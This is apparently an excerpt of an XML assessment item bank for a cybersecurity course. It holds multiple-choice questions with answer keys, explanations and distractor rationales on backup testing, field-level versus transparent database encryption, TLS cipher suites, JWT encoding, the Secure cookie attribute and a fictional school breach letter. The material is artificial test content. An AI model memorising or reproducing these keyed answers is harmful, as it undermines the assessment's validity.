+      <adaptive_meta><b_param>0.82</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>100</est_response_time_sec>
+        <prerequisite_topics>5.5 5.6</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The article mentions "backups existed but had not been tested since 2021, two failed to restore during recovery." Analyze why untested backups represent a critical gap in data protection, even when backups exist and are made regularly.</stem>
+      <choices>
+        <choice key="A">Untested backups are a minor risk, backup software rarely produces corrupt files, so testing is an optional verification step rather than a critical control.</choice>
+        <choice key="B">A backup that has never been restored is an assumption, not a verified control. Backup corruption causes include media degradation, software version mismatches between backup and restore tools, incomplete backup jobs that appear successful in logs, and ransomware that encrypts backup files silently. The only way to verify a backup can restore a system to a working state is to perform a test restoration in an isolated environment. Untested backups provide false assurance, the organization believes it can recover when the actual recovery capability is unknown or (as shown) partially absent.</choice>
+        <choice key="C">Untested backups are specifically a problem for tape media, modern cloud backups are verified automatically by the provider and do not require manual testing.</choice>
+        <choice key="D">The real gap is backup frequency, not testing, if backups run daily, failure of two restore operations still leaves sufficient data for recovery.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>Backup testing is not optional, it is the only way to verify that a backup achieves its purpose (enabling recovery). Common failure modes include: silent corruption (backup completes without errors but produces an unrestorable file); software version drift (the restore tool version differs from the backup tool version used at backup time); incomplete backups where critical database transaction logs were excluded; and increasingly, ransomware specifically targeting backup systems and cloud backup repositories to silently encrypt backup files months before deploying the main payload, making backups created during the infection window useless. NIST SP 800-34 (Contingency Planning) explicitly requires regular tested restoration exercises for this reason. Meridian's experience, backup failure during an active crisis, is the most stressful and damaging time to discover the backup was non-functional.</explanation>
+      <distractor_rationale>
+        <choice key="A">Backup corruption is common enough that major cloud backup providers (AWS, Azure) include integrity verification as a built-in feature. Backup software produces false-success completion messages when underlying storage errors occur, when backup agents time out silently, or when ransomware encrypts backup targets. Testing is not optional; it is the only verification.</choice>
+        <choice key="C">Cloud backup providers verify storage integrity (file upload completeness) but do not perform application-level restore testing, verifying that a SQL Server database backup can be attached and queried, or that a VM backup boots to a functional OS, requires a test restoration that the customer must execute. Cloud storage redundancy does not substitute for restore testing.</choice>
+        <choice key="D">Backup frequency affects the recovery point objective (maximum data loss window), not backup integrity. Daily backups that all fail to restore produce the same outcome as no backups. Frequency and restorability are independent dimensions of backup quality.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S05-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S05</stimulus_ref>
+        <topic_refs>5.5 5.6</topic_refs><lo_refs>LO 5.5.A LO 5.5.B LO 5.6.A LO 5.6.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.A" lo="LO 5.6.B" weight="0.55"/>
+        <secondary skill="1.D" lo="LO 5.5.B" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.44</b_param><a_param>1.60</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>164</est_response_time_sec>
+        <prerequisite_topics>5.5 5.6</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>Security experts in the article recommend "field-level encryption of sensitive health data." NovaStar Tech's CISO wants to understand what problem field-level encryption solves that database-level encryption (TDE - Transparent Data Encryption) does not. Evaluate the correct explanation.</stem>
+      <choices>
+        <choice key="A">Field-level encryption and TDE are equivalent, both encrypt data at rest and provide the same protection against all threat scenarios.</choice>
+        <choice key="B">TDE is stronger than field-level encryption because TDE encrypts the entire database including indexes, while field-level encryption only protects the specified columns and leaves metadata exposed.</choice>
+        <choice key="C">TDE encrypts data files on disk, it protects against physical theft of the database server or storage media, but decrypts transparently for any application or user that connects to the database with valid credentials. An attacker who compromises an application account (like the webapp_user from Exhibit A) or a DBA account can query TDE-encrypted data in plaintext because the database engine decrypts it automatically before returning results. Field-level encryption encrypts specific columns (SSN, diagnosis, insurance ID) with keys managed outside the database, even a full SQL dump or a compromised DBA account returns ciphertext for those fields, requiring the field-level decryption key to read the sensitive values.</choice>
+        <choice key="D">Field-level encryption protects data in transit between the application and database, while TDE protects data at rest on the database server, they address complementary scenarios and are not directly comparable.</choice>
+      </choices>
+      <answer key="C"/>
+      <explanation>TDE (Transparent Data Encryption) encrypts the database's data files on disk, protection against the threat model where an attacker physically removes a hard drive or obtains a raw database backup file. However, TDE is "transparent" by design: the database engine decrypts data automatically for any authenticated connection. An SQL injection attack (like Exhibit A's UNION SELECT returning 847 password hashes) succeeds equally against a TDE-protected database, because the attacker queries through the database engine, which decrypts on their behalf. Field-level encryption stores specific sensitive values (SSNs, credit card numbers, diagnoses) as ciphertext in the column, with the decryption key held only by the application's encryption module, not the database. Even a DBA running "SELECT ssn FROM patients" sees ciphertext. This directly addresses the threat model of database-layer compromise (SQL injection, rogue DBA, stolen backup file).</explanation>
+      <distractor_rationale>
+        <choice key="A">TDE and field-level encryption are not equivalent and protect against different threat models. TDE does not protect against authenticated query attacks (SQL injection, compromised credentials, rogue DBA). Field-level encryption does, at the cost of higher implementation complexity and reduced queryability on encrypted fields.</choice>
+        <choice key="B">TDE encrypting indexes is true but does not change the fundamental limitation: TDE decrypts everything transparently for authenticated connections. Encrypting metadata alongside data does not prevent an authenticated attacker from querying the plaintext values through the database engine.</choice>
+        <choice key="D">Field-level encryption operates on data at rest in the database, it is not a transit encryption mechanism. Transit encryption is provided by TLS between the application and database. Field-level encryption specifically addresses the scenario where an attacker can query the database (via application credentials, SQL injection, or direct DBA access) and receive ciphertext instead of sensitive plaintext.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+
+<!-- S06 - Plaintext vs Encrypted Comparison
+     Topics: 5.3, 5.4 | Skills: 1.A 1.C 2.A 1.D+2.A -->
+<stimulus_set id="U5-S06" difficulty_range="1-3">
+  <stimulus>
+    <type>payload_comparison</type>
+    <label>Exhibit F - Packet Capture Comparison: ClearPath Financial API Traffic</label>
+    <context>ClearPath Financial's network team captured API traffic before and after migrating from HTTP to HTTPS (TLS 1.3) for the internal reporting dashboard. The following excerpts show the same API call in both captures.</context>
+    <artifact format="composite">
+      <component id="F1" type="log_file">
+        <log_type>Wireshark Capture - HTTP (Before Migration) - Packet 447</log_type>
+        <entries>
+Frame 447: 612 bytes on wire
+  Internet Protocol: 10.0.5.22 -&gt; 10.0.2.80
+  Transmission Control Protocol: Src Port: 52341, Dst Port: 80
+  Hypertext Transfer Protocol:
+    GET /api/v2/reports/quarterly HTTP/1.1
+    Host: reporting.clearpath-internal.net
+    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZnJlZHkubGF3c29uIiwicm9sZSI6ImZpbmFuY2VfYW5hbHlzdCJ9.a1b2c3d4
+    Cookie: session_id=8f3a2b1c9e4d5f6a7b8c9d0e1f2a3b4c
+
+[HTTP Response 200 OK]
+    Content-Type: application/json
+    Body: {"quarter":"Q4-2023","revenue":4821094.22,"cost_center_breakdown":[{"dept":"Operations","spend":1240000},{"dept":"Engineering","spend":982000}]}
+        </entries>
+      </component>
+      <component id="F2" type="log_file">
+        <log_type>Wireshark Capture - HTTPS/TLS 1.3 (After Migration) - Packet 891</log_type>
+        <entries>
+Frame 891: 612 bytes on wire
+  Internet Protocol: 10.0.5.22 -&gt; 10.0.2.80
+  Transmission Control Protocol: Src Port: 52892, Dst Port: 443
+  Transport Layer Security:
+    TLSv1.3 Record Layer: Application Data Protocol: http-over-tls
+    Encrypted Application Data: 3a8f2c1b9e4d7f0a6b5c8d2e1a3f4b7c9e0d2a1b...
+    [Cannot decode - encrypted with ECDHE_AES_256_GCM_SHA384]
+        </entries>
+      </component>
+    </artifact>
+    <provenance>Fictional. All packet data, credentials, and financial figures are invented.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S06-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S06</stimulus_ref>
+        <topic_refs>5.3</topic_refs><lo_refs>LO 5.3.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.3.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.30</b_param><a_param>0.92</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>50</est_response_time_sec>
+        <prerequisite_topics>5.3</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>Packet F1 shows the Authorization Bearer token and session_id cookie visible in plaintext. Packet F2 shows only encrypted bytes. Which specific security property does TLS provide that HTTP lacks, as illustrated by this comparison?</stem>
+      <choices>
+        <choice key="A">Authentication, TLS verifies the identity of the client to the server, preventing unauthorized users from calling the API.</choice>
+        <choice key="B">Non-repudiation, TLS produces a cryptographic log proving that specific packets were exchanged between two parties.</choice>
+        <choice key="C">Availability, TLS prevents denial-of-service attacks by ensuring the connection cannot be reset by third parties.</choice>
+        <choice key="D">Confidentiality, TLS encrypts the entire communication between client and server so that network observers (on the same LAN segment, at a network switch, or at an ISP) cannot read the request headers, authentication tokens, session cookies, or response body that are visible in plaintext in Packet F1.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>Confidentiality is the property that prevents unauthorized parties from reading data. Packet F1 shows that every element of the HTTP transaction, the API endpoint, the Bearer token (a JWT containing the user's identity and role), the session cookie, and the financial response body, is readable by any host on the network path. Packet F2 shows the same transaction encrypted: only "[Cannot decode - encrypted with ECDHE_AES_256_GCM_SHA384]" is visible to a network observer. TLS's encryption provides confidentiality for data in transit. The Bearer token and session cookie visible in F1 could be stolen from the network by any observer with access to the traffic (ARP poisoning, rogue switch port mirroring, network tap) and replayed to authenticate as the original user.</explanation>
+      <distractor_rationale>
+        <choice key="A">Authentication in this context is provided by the Bearer token and session cookie, not by TLS itself. TLS server certificates authenticate the server to the client (verifying the server is who it claims to be), but client/user authentication is handled by the application-layer credential system. TLS provides transport confidentiality, not application-layer user authentication.</choice>
+        <choice key="B">Non-repudiation requires proof of origin that cannot be denied. TLS provides data integrity (MAC verification) and authentication of the server's certificate, but does not create a legally attributable audit record of communication. Non-repudiation for API calls is provided by application-layer audit logging, not TLS itself.</choice>
+        <choice key="C">TLS provides some protection against injection-based connection resets but is not specifically an availability mechanism. TLS does not prevent DDoS attacks, which operate at the network/transport layer below TLS. Availability is primarily addressed through redundancy, rate limiting, and DDoS mitigation services.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S06-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S06</stimulus_ref>
+        <topic_refs>5.3 5.4</topic_refs><lo_refs>LO 5.3.B LO 5.4.A</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.3.B" weight="0.70"/>
+        <secondary skill="1.A" lo="LO 5.4.A" weight="0.30"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.50</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.3 5.4</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>Packet F2 shows the cipher suite as ECDHE_AES_256_GCM_SHA384. Identify what each component provides: ECDHE, AES-256-GCM, and SHA384, and explain why this combination is considered strong for 2024.</stem>
+      <choices>
+        <choice key="A">ECDHE provides compression, AES-256-GCM provides authentication, and SHA384 provides encryption, together they form a balanced suite for general web use.</choice>
+        <choice key="B">The cipher suite is strong primarily because of SHA384, longer hash outputs indicate stronger overall suite security regardless of the key exchange or cipher component strengths.</choice>
+        <choice key="C">ECDHE is the encryption algorithm, AES-256 is the hash function, and GCM-SHA384 is the key exchange method, the suite is strong because it uses three independent algorithms for redundancy.</choice>
+        <choice key="D">ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) provides key exchange with forward secrecy, ephemeral keys mean past sessions cannot be decrypted if the long-term private key is later compromised. AES-256-GCM provides authenticated encryption (confidentiality via AES-256 block cipher in Galois/Counter Mode plus integrity via the GCM authentication tag). SHA384 provides the HMAC/PRF for key derivation and handshake verification. The combination is considered strong because it achieves forward secrecy, 256-bit symmetric encryption, and authenticated encryption (preventing tampering) in a single efficient suite with hardware acceleration support.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>Each component of a TLS cipher suite has a specific role: ECDHE (key exchange with forward secrecy) negotiates a session key that is discarded after use, if an attacker records encrypted traffic and later obtains the server's long-term private key, they cannot decrypt past sessions because the ephemeral ECDHE key was never stored. AES-256-GCM (symmetric authenticated encryption) provides both confidentiality (AES-256 encryption) and integrity (GCM authentication tag prevents ciphertext tampering); "authenticated encryption" is stronger than encryption alone because it also prevents bit-flipping attacks. SHA384 in TLS 1.3 context is used for the HKDF key derivation function and handshake verification. The suite is strong in 2024 because it addresses the major threat models: passive interception (AES-256 confidentiality), active ciphertext modification (GCM authentication), and future key compromise (ECDHE forward secrecy).</explanation>
+      <distractor_rationale>
+        <choice key="A">The roles are reversed in this option, ECDHE provides key exchange (not compression), AES-256-GCM provides authenticated encryption (not just authentication), and SHA384 provides hashing for key derivation (not encryption). Compression in TLS is actually a security risk (CRIME attack) and is disabled in modern TLS configurations.</choice>
+        <choice key="B">Suite strength is a product of all components, a strong hash function paired with a weak key exchange or a broken cipher produces a weak suite overall. Hash output length (384 bits vs 256 bits) provides marginal security benefit in practice; the more impactful factors are key exchange forward secrecy and authenticated encryption mode.</choice>
+        <choice key="C">The components are misidentified. ECDHE is the key exchange algorithm (Elliptic Curve Diffie-Hellman Ephemeral), not an encryption algorithm. AES-256 is the symmetric cipher (not a hash function). GCM and SHA384 are separate: GCM is the cipher mode (providing authenticated encryption) and SHA384 is the hash function used in key derivation.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S06-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S06</stimulus_ref>
+        <topic_refs>5.3 5.4</topic_refs><lo_refs>LO 5.3.A LO 5.4.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="2.A" lo="LO 5.4.B" weight="0.65"/>
+        <secondary skill="3.B" lo="LO 5.3.A" weight="0.35"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.82</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>100</est_response_time_sec>
+        <prerequisite_topics>5.3 5.4</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The JWT Bearer token in Packet F1 reads: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZnJlZHkubGF3c29uIiwicm9sZSI6ImZpbmFuY2VfYW5hbHlzdCJ9.a1b2c3d4. A developer states "the token is encoded so it's safe to transmit over HTTP." Evaluate this claim.</stem>
+      <choices>
+        <choice key="A">The developer is correct, the token appears as random characters, indicating it is encrypted and cannot be decoded without the server's private key.</choice>
+        <choice key="B">The developer is partially correct, the header and signature are encrypted, but the payload section containing user data is transmitted in plaintext as a known JWT design limitation.</choice>
+        <choice key="C">The developer is incorrect. JWT tokens use Base64URL encoding, not encryption, the header and payload sections are directly decodable by anyone who receives them without any key. Decoding the second section (eyJ1c2VyX2lkIjoiZnJlZHkubGF3c29uIiwicm9sZSI6ImZpbmFuY2VfYW5hbHlzdCJ9) reveals {"user_id":"fredy.lawson","role":"finance_analyst"} in plaintext. The signature section prevents tampering but does not encrypt the claims. Transmitting a JWT over HTTP exposes the user identity, role, and token itself to any network observer who can replay it.</choice>
+        <choice key="D">The token is safe over HTTP because JWT signatures use RSA-2048 encryption that prevents the token from being read without the server's private key.</choice>
+      </choices>
+      <answer key="C"/>
+      <explanation>Base64URL encoding and encryption are fundamentally different: encoding transforms binary data to ASCII text using a reversible mapping with no secret key (any Base64 decoder reads it instantly); encryption transforms data to ciphertext that requires a specific key to reverse. JWT tokens have three Base64URL-encoded sections: header (algorithm type), payload (claims, user data, roles, expiry), and signature (HMAC or RSA over header+payload). All three are readable by anyone who receives the token, the signature only prevents modification of the claims, it does not hide them. Transmitting a JWT over HTTP exposes all claims in the payload, the full token for replay by a network observer, and the algorithm used for signature verification. HTTPS is required to protect JWT tokens in transit.</explanation>
+      <distractor_rationale>
+        <choice key="A">The token appearing as "random characters" is the visual appearance of Base64URL encoding (which produces alphanumeric strings), not encryption. A simple Base64 decoder (available in every browser's developer tools) immediately decodes all three sections of the JWT without any key.</choice>
+        <choice key="B">All three sections of a standard JWT (header, payload, signature) are Base64URL-encoded, not encrypted. None of them require a key to decode. The signature verifies integrity (that the payload was not modified) but conceals nothing.</choice>
+        <choice key="D">HMAC-SHA256 (HS256) JWTs use a symmetric secret, not RSA. RSA-signed JWTs (RS256) use asymmetric keys for the signature, but the signature's purpose is authentication/integrity of the claims, not encryption of them. In both cases, the payload is fully readable without any key.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S06-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S06</stimulus_ref>
+        <topic_refs>5.3 5.4</topic_refs><lo_refs>LO 5.3.A LO 5.3.B LO 5.4.A LO 5.4.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.D" lo="LO 5.4.B" weight="0.55"/>
+        <secondary skill="2.A" lo="LO 5.3.B" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.46</b_param><a_param>1.62</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>166</est_response_time_sec>
+        <prerequisite_topics>5.3 5.4</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>ClearPath Financial migrated the reporting dashboard to HTTPS. However, the session_id cookie visible in Packet F1 is also used by three other internal tools still running on HTTP. Analyze the residual risk from this mixed HTTP/HTTPS environment and identify the most complete remediation.</stem>
+      <choices>
+        <choice key="A">There is no residual risk, the reporting dashboard is now HTTPS-protected, so the session cookie is secure regardless of other tools' protocol.</choice>
+        <choice key="B">If the session_id cookie is shared across HTTP and HTTPS applications and does not have the "Secure" attribute set, the browser will transmit it over HTTP connections to the other three tools, exposing the cookie in plaintext on those requests. An attacker observing any HTTP traffic from that client can steal the session_id and replay it against the now-HTTPS reporting dashboard. Complete remediation: (1) set the Secure attribute on all session cookies (browser will never send them over HTTP); (2) migrate all three remaining HTTP tools to HTTPS; (3) consider separate session tokens per application so a stolen cookie from one application cannot authenticate to another.</choice>
+        <choice key="C">The residual risk is low because HTTP is only used for internal tools on the internal network, where attackers are unlikely to be present.</choice>
+        <choice key="D">Set the HttpOnly attribute on the session cookie, which prevents it from being transmitted over HTTP connections and eliminates the residual risk without requiring migration of the three HTTP tools.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>The "Secure" cookie attribute instructs the browser to only transmit a cookie over HTTPS connections, never over HTTP, even to the same domain. Without it, the browser sends the session_id in plaintext HTTP requests to any matching domain/path, regardless of whether the original session was established over HTTPS. An attacker conducting ARP poisoning or monitoring a switch port can capture session_id from an HTTP request to tool #2 and replay it against the HTTPS reporting dashboard. The complete remediation addresses all three layers: cookie attribute (Secure flag), protocol migration of remaining HTTP applications, and session isolation to limit the blast radius of any single cookie theft. The three HTTP tools represent residual exposure even after the dashboard migration.</explanation>
+      <distractor_rationale>
+        <choice key="A">Cookies without the Secure attribute are transmitted by the browser over any connection matching their domain/path scope, including HTTP. The HTTPS upgrade of the reporting dashboard does not protect the cookie from being leaked over HTTP requests to the other three tools on the same domain.</choice>
+        <choice key="C">Internal network attackers are a well-documented threat: ARP poisoning, rogue WiFi access points in meeting rooms, compromised internal hosts with packet capture capabilities, and insider threats all enable internal HTTP traffic interception. "Internal-only" is not an acceptable security boundary for session cookies.</choice>
+        <choice key="D">HttpOnly prevents JavaScript from accessing the cookie (mitigating XSS-based cookie theft), but it does not restrict the cookie to HTTPS connections. HttpOnly and Secure are independent attributes with different purposes. Only the Secure attribute prevents HTTP transmission of the cookie.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+<!-- S07 - Data Breach Disclosure Letter
+     Topics: 5.5, 5.6 | Skills: 1.A 1.C 3.B 3.A+2.A -->
+<stimulus_set id="U5-S07" difficulty_range="1-3">
+  <stimulus>
+    <type>breach_letter</type>
+    <label>Exhibit G - Data Breach Notification Letter: Vantara USD to Affected Families</label>
+    <context>Vantara USD mailed the following letter to families after a breach of its Student Information System. The district's legal team drafted it under FERPA and California AB 1877 notification requirements. NovaStar Tech's security team used it as a training example.</context>
+    <artifact format="letter">
+      <from>Vantara USD - Office of the Superintendent</from>
+      <to>Parents and Guardians of Enrolled Students</to>
+      <date>March 1, 20XX</date>
+      <subject>Important Notice: Security Incident Involving Student Information</subject>
+      <body>
+Dear Parent or Guardian,
+
+We are writing to inform you of a security incident that may have affected information
+about your child enrolled at Vantara Unified School District.
+
+WHAT HAPPENED
+On January 15, 20XX, we discovered that an unauthorized individual gained access to our
+Student Information System between December 3, 20XX and January 15, 20XX (43 days).
+The unauthorized access was discovered when a staff member noticed unusual login activity.
+
+INFORMATION INVOLVED
+The following categories of student information may have been accessed:
+  - Full name and date of birth
+  - Student ID numbers
+  - Home address and parent contact information
+  - Enrollment status and grade level
+  - Attendance and disciplinary records
+  - For students receiving financial assistance: income documentation and assistance amounts
+
+WHAT WE ARE DOING
+  - We have contained the breach and secured the affected system.
+  - We have engaged a cybersecurity forensics firm to investigate.
+  - We have notified the California Attorney General and appropriate education authorities.
+  - We are implementing enhanced security measures including multi-factor authentication.
+
+WHAT YOU CAN DO
+  - Monitor your child's records for signs of identity misuse.
+  - Consider placing a credit freeze on your child's credit profile.
+  - Contact us at breach-response@vantara-usd.edu with questions.
+
+We sincerely apologize for this incident and the concern it may cause your family.
+
+Superintendent, Vantara USD
+      </body>
+    </artifact>
+    <provenance>Fictional. All names, dates, and data categories are invented.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S07-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S07</stimulus_ref>
+        <topic_refs>5.6</topic_refs><lo_refs>LO 5.6.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.6.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.30</b_param><a_param>0.92</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>52</est_response_time_sec>
+        <prerequisite_topics>5.6</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The letter states the breach occurred December 3 but was not discovered until January 15, a 43-day dwell period. The discovery was made by a staff member who "noticed unusual login activity." What does this discovery method reveal about Vantara USD's security monitoring posture?</stem>
+      <choices>
+        <choice key="A">The 43-day dwell time is acceptable, most breaches are discovered within 60 days, and human detection is as effective as automated monitoring.</choice>
+        <choice key="B">Discovery by a human staff member noticing anomalies, rather than by automated SIEM alerting, anomaly detection, or EDR, indicates the absence of automated monitoring systems that would have flagged unusual login patterns (new IP geolocation, off-hours access, bulk record queries) within hours of the December 3 initial access, reducing the 43-day exposure window to potentially the same day.</choice>
+        <choice key="C">Human discovery is more reliable than automated systems because automated alerts produce high false-positive rates that cause alert fatigue, making human observation superior for detecting actual breaches.</choice>
+        <choice key="D">The 43-day dwell time is a FERPA violation in itself, federal law requires breaches to be discovered within 30 days of occurrence.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>A staff member noticing "unusual login activity" is an indicator that automated monitoring with defined alert thresholds was absent or insufficient. Automated SIEM rules detecting anomalous authentication patterns, login from a new IP/country, bulk record access outside business hours, query volume exceeding normal baselines, or access to record categories inconsistent with the user's role, would have generated alerts within the first session of unauthorized access. Modern UEBA (User and Entity Behavior Analytics) tools specifically detect the behavioral patterns characteristic of credential-based intrusions. The 43-day window enabled access to income documentation and financial assistance data for students receiving financial aid, a particularly sensitive data category. Automated detection would have dramatically reduced exposure.</explanation>
+      <distractor_rationale>
+        <choice key="A">Industry mean dwell time (time from compromise to discovery) has been declining but remains measured in weeks to months for organizations without mature detection programs. "Average" dwell time is not an acceptable benchmark, the goal is minimizing dwell time, not matching the average. Human detection is slower and less consistent than automated alerting on defined behavioral indicators.</choice>
+        <choice key="C">Alert fatigue is a real challenge in poorly-tuned SIEM deployments, but the solution is better alert tuning, not abandoning automated detection. Well-tuned SIEM rules with appropriate baselines produce high-fidelity alerts that outperform human observation for systematic anomaly detection at scale.</choice>
+        <choice key="D">FERPA (Family Educational Rights and Privacy Act) does not specify a maximum dwell time before breach discovery, it governs disclosure timelines after discovery and the categories of protected records. Discovery timeline is not a FERPA compliance metric.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S07-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S07</stimulus_ref>
+        <topic_refs>5.5 5.6</topic_refs><lo_refs>LO 5.5.A LO 5.6.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.6.B" weight="0.70"/>
+        <secondary skill="3.B" lo="LO 5.5.A" weight="0.30"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.50</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.5 5.6</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The "Information Involved" section includes "income documentation and assistance amounts" for students receiving financial assistance. Explain why this specific data category elevates the severity of the breach beyond the other listed categories.</stem>
+      <choices>
+        <choice key="A">Income documentation and assistance amounts constitute financial PII that reveals family economic status, enabling targeted socioeconomic profiling, benefits fraud (fraudulent assistance applications using harvested income documentation), and predatory targeting of financially vulnerable families. This category is more sensitive than general demographic data (name, DOB, address) because it discloses economic hardship status that families may not have shared publicly, creating stigma risk, and the income documents may contain enough detail to file fraudulent tax returns or benefits claims in the parents' names.</choice>
+        <choice key="B">Income documentation is less sensitive than date of birth, which is more useful for identity fraud, the financial assistance data does not meaningfully elevate breach severity.</choice>
+        <choice key="C">Income documentation elevates severity only if it includes Social Security numbers, which are not explicitly listed among the exposed categories.</choice>
+        <choice key="D">Financial assistance data is the least sensitive category listed because it is already shared with the federal government through financial aid applications, so its exposure represents minimal additional risk.</choice>
+      </choices>
+      <answer key="A"/>
+      <explanation>Financial assistance data creates compounded risk beyond standard PII: (1) economic status disclosure, families receiving assistance may not have publicized this, and disclosure can cause stigma, targeted solicitation by predatory lenders, or social harm to the child; (2) benefits fraud, income documentation submitted for assistance applications may contain pay stubs, tax returns, or government benefit amounts that enable fraudulent applications for other assistance programs in the parents' names; (3) predatory targeting, financially vulnerable families are disproportionately targeted by scammers and phishers who use knowledge of financial hardship as a social engineering hook. Data protection frameworks (FERPA, CCPA) classify financial information as requiring heightened protection precisely because of these downstream risks.</explanation>
+      <distractor_rationale>
+        <choice key="B">Date of birth combined with name and address is useful for identity fraud, but income documentation adds a distinct risk category, financial status and documented income levels, that has different downstream harm vectors than demographic data alone. Both are serious; income documentation is additionally sensitive due to economic status disclosure and benefits fraud risk.</choice>
+        <choice key="C">Income documentation can enable harm without SSNs: fraudulent assistance applications, predatory targeting, and economic status disclosure do not require an SSN. The absence of SSNs from the listed categories reduces identity theft risk but does not eliminate the specific harms from income data exposure.</choice>
+        <choice key="D">Sharing income documentation with federal financial aid programs is a controlled disclosure under specific legal frameworks with defined data use limitations. Exposure in a breach removes those use limitations, the data is now available to anyone who obtained it, for any purpose. Controlled disclosure does not reduce the sensitivity of unauthorized disclosure.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S07-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S07</stimulus_ref>
+        <topic_refs>5.6</topic_refs><lo_refs>LO 5.6.A LO 5.6.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.B" lo="LO 5.6.B" weight="0.65"/>
+        <secondary skill="1.C" lo="LO 5.6.A" weight="0.35"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.85</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>102</est_response_time_sec>
+        <prerequisite_topics>5.6</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The "What We Are Doing" section states MFA is being implemented after the breach. Analyzing the breach timeline (December 3 compromise via credential access), evaluate whether MFA implementation before the breach would have prevented it, and identify what type of MFA would be most appropriate for a school district SIS.</stem>
+      <choices>
+        <choice key="A">MFA would not have prevented the breach because the attacker gained access through a phishing email that could also steal MFA tokens.</choice>
+        <choice key="B">MFA would most likely have prevented or significantly limited the breach: the unauthorized access was credential-based (unusual login activity suggests the attacker used valid credentials, likely obtained through phishing or credential stuffing). Most phishing attacks and credential dumps target username/password pairs, they do not capture time-based MFA codes or hardware token responses. For a school district SIS, authenticator app-based TOTP (Time-based One-Time Password, e.g., Google Authenticator) provides strong protection at low cost and complexity appropriate for district IT staff and administrators without requiring hardware tokens.</choice>
+        <choice key="C">MFA is only effective for preventing attacks where the attacker has no physical access to the target, since the SIS is hosted internally, MFA provides no additional protection over strong passwords.</choice>
+        <choice key="D">MFA would have prevented the breach only if hardware FIDO2 security keys were used, software-based MFA (authenticator apps) can be phished and would not have helped here.</choice>
+      </choices>
+      <answer key="B"/>
